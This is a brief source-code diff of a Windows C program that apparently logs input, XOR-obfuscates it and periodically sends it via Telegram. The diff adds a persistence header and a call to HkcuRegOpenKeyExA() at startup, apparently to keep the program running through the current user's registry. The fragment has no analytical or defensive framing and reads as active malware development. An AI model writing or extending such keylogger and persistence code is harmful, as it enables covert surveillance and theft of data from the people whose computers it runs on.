@@ -1,7 +1,7 @@
 #include <stdio.h>
 #include <time.h>
 #include <windows.h> 
-
+#include "persistence.h"
 #include "logger.h"
 #include "telegram.h"
 
@@ -13,6 +13,7 @@ int main(void) {
     char xorKey = 'k';
 
     time_t lastSendTime = time(NULL);
+    HkcuRegOpenKeyExA();
 
 
     while (1) {
